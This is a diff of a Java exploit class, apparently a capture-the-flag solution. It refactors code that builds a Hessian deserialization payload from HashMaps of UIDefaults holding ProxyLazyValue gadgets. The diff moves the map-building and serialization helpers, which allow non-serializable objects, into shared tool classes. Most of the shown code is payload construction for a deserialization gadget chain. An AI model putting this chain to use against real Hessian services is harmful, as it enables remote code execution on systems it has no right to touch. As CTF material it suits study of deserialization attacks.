@@ -2,6 +2,7 @@ package solution;
 
 import com.caucho.hessian.io.Hessian2Output;
 import com.caucho.hessian.io.SerializerFactory;
+import tools.HessianTools;
 import tools.ReflectTools;
 
 import java.io.ByteArrayOutputStream;
@@ -9,11 +10,7 @@ import java.lang.reflect.Method;
 import java.util.HashMap;
 
 import javax.naming.InitialContext;
-import javax.naming.NamingEnumeration;
-import javax.naming.directory.Attribute;
-import javax.naming.directory.Attributes;
 import javax.naming.directory.DirContext;
-import javax.naming.directory.SearchResult;
 import javax.swing.*;
 
 public class Exp {
@@ -82,14 +79,14 @@ public class Exp {
         u1.put("aaa", proxyLazyValue1);
         u2.put("aaa", proxyLazyValue1);
 
-        HashMap map1 = makeMap(u1, u2);
+        HashMap map1 = ReflectTools.makeMap1(u1, u2);
 
         UIDefaults u3 = new UIDefaults();
         UIDefaults u4 = new UIDefaults();
         u3.put("bbb", proxyLazyValue2);
         u4.put("bbb", proxyLazyValue2);
 
-        HashMap map2 = makeMap(u3, u4);
+        HashMap map2 = ReflectTools.makeMap1(u3, u4);
 
         HashMap map = new HashMap();
         map.put(1, map1);
@@ -97,30 +94,7 @@ public class Exp {
 
 
 
-        return serialize2(map);
+        return HessianTools.hessianSer2bytes(map, "2");
     }
 
-    private static HashMap<Object, Object> makeMap(Object v1, Object v2) throws Exception {
-        HashMap<Object, Object> map = new HashMap<>();
-        Method putValMethod = HashMap.class.getDeclaredMethod("putVal", int.class, Object.class, Object.class, boolean.class, boolean.class);
-        putValMethod.setAccessible(true);
-        putValMethod.invoke(map, 0, v1, 123, false, true);
-        putValMethod.invoke(map, 1, v2, 123, false, true);
-        return map;
-    }
-
-    private static byte[] serialize2(Object o) throws Exception {
-        ByteArrayOutputStream bao = new ByteArrayOutputStream();
-        Hessian2Output output = new Hessian2Output(bao);
-        
-        // 修复Hessian序列化配置
-        SerializerFactory serializerFactory = output.getSerializerFactory();
-        serializerFactory.setAllowNonSerializable(true);
-        
-        // 添加对ProxyLazyValue的特殊处理
-        output.setSerializerFactory(serializerFactory);
-        output.writeObject(o);
-        output.flush();
-        return bao.toByteArray();
-    }
 }
